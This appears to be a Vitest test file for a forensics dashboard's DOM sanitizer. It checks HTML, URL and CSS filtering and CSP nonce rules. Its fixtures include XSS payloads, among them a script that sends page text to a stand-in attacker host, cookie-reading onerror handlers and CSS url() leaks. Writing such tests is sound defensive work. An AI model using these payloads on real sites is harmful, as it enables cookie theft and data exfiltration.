import { readFile } from "node:fs/promises";
import { runInNewContext } from "node:vm";
import { describe, expect, it } from "vitest";

interface SafeDomApi {
  isSafeUrl(value: string, attribute: string, tagName: string): boolean;
  sanitizeCssText(value: string): string;
  precleanHtml(value: string): string;
}

async function loadApi(): Promise<SafeDomApi> {
  const source = await readFile(new URL("../../../public/js/safe-dom.js", import.meta.url), "utf8");
  const context: { DFIRSafeDOM?: SafeDomApi } = {};
  runInNewContext(source, context);
  if (!context.DFIRSafeDOM) throw new Error("safe-dom.js did not publish its testable API");
  return context.DFIRSafeDOM;
}

describe("safe DOM policy — adversarial evidence fixtures", () => {
  it("neutralizes executable HTML in artifact names, commands, and report fields", async () => {
    const api = await loadApi();
    const fixtures = [
      '<img src=x onerror="alert(document.cookie)">',
      '<script>fetch("https://attacker.invalid/"+document.body.innerText)</script>',
      '<svg><a href="javascript:alert(1)">artifact</a></svg>',
      '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
      '<div style="background:url(https://attacker.invalid/leak)">report field</div>',
    ];

    for (const fixture of fixtures) {
      const cleaned = api.precleanHtml(fixture).toLowerCase();
      expect(cleaned).not.toMatch(/<script|<iframe|\sonerror\s*=|\ssrcdoc\s*=|\sstyle\s*=/);
    }
  });

  it("rejects scriptable URLs but retains ordinary evidence and same-origin links", async () => {
    const api = await loadApi();
    expect(api.isSafeUrl("javascript:alert(1)", "href", "a")).toBe(false);
    expect(api.isSafeUrl("data:text/html,<script>alert(1)</script>", "href", "a")).toBe(false);
    expect(api.isSafeUrl("//attacker.invalid/leak", "src", "img")).toBe(false);
    expect(api.isSafeUrl("/cases/demo/evidence/screenshot.png", "src", "img")).toBe(true);
    expect(api.isSafeUrl("/sw.js", "src", "script")).toBe(true);
    expect(api.isSafeUrl("javascript:alert(1)", "src", "script")).toBe(false);
    expect(api.isSafeUrl("https://example.invalid/advisory", "href", "a")).toBe(true);
  });

  it("allows presentation CSS but drops CSS execution and network primitives", async () => {
    const api = await loadApi();
    expect(api.sanitizeCssText("display:none;color:var(--text-muted);width:42%")).toBe(
      "display:none;color:var(--text-muted);width:42%",
    );
    expect(api.sanitizeCssText("background:url(https://attacker.invalid/x);color:red")).toBe("color:red");
    expect(api.sanitizeCssText("width:expression(alert(1));position:fixed")).toBe("position:fixed");
  });
});

describe("browser documents — governed rendering only", () => {
  const browserFiles = [
    "../../../public/dashboard.html",
    "../../../public/mobile.html",
    "../../../public/present.html",
  ];

  it("loads the sink guard before application rendering code", async () => {
    for (const path of browserFiles) {
      const html = await readFile(new URL(path, import.meta.url), "utf8");
      const guard = html.indexOf('src="/js/safe-dom.js"');
      expect(guard, path).toBeGreaterThan(0);
      expect(guard, path).toBeLessThan(html.indexOf("<body"));
    }
  });

  it("contains no inline style or inline event-handler attributes", async () => {
    for (const path of browserFiles) {
      const html = await readFile(new URL(path, import.meta.url), "utf8");
      expect(
        [...html.matchAll(/\sstyle\s*=\s*["']/gi)].map((m) => m[0]),
        path,
      ).toEqual([]);
      expect(
        [...html.matchAll(/\son[a-z]+\s*=\s*["']/gi)].map((m) => m[0]),
        path,
      ).toEqual([]);
    }
  });

  it("nonces every inline script and stylesheet", async () => {
    for (const path of browserFiles) {
      const html = await readFile(new URL(path, import.meta.url), "utf8");
      const inlineScripts = [...html.matchAll(/<script(?![^>]*\ssrc=)[^>]*>/g)].map((m) => m[0]);
      const styles = [...html.matchAll(/<style[^>]*>/g)].map((m) => m[0]);
      for (const opener of [...inlineScripts, ...styles]) {
        expect(opener, `${path}: ${opener}`).toContain('nonce="__CSP_NONCE__"');
      }
    }
  });
});
